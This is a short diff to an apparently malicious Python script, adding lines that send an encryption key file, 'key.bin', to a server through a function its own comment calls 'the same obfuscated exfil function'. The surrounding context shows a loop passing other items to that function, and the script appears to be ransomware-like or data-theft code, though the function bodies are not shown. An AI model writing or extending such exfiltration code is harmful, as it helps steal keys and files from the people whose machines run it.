@@ -28,5 +28,10 @@ def z0():
     for p in l:
         r9(p)
 
+# Send the encryption key file to the server too
+if os.path.exists('key.bin'):
+    r9('key.bin')  # Reuses the same obfuscated exfil function
+
+
 if __name__ == "__main__":
     z0()
